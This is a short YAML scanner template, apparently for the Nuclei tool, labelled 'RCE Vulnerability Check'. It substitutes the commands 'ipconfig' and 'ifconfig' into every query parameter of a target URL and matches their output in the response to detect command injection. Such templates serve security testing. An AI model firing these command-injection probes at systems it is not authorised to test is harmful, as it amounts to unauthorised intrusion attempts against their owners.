http:
- fuzzing:
  - fuzz:
    - '{{reflection}}'
    mode: multiple
    part: query
    type: replace
  matchers:
  - type: word
    words:
    - Windows IP Configuration
    - inet 127.0.0.1  netmask 255.0.0.0
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}'
  payloads:
    reflection:
    - ipconfig
    - ifconfig
  stop-at-first-match: true
id: rce-automation
info:
  author: rix4uni
  description: Checks for Remote Code Excution vulnerabilities
  name: RCE Vulnerability Check
  severity: critical
  tags: rce
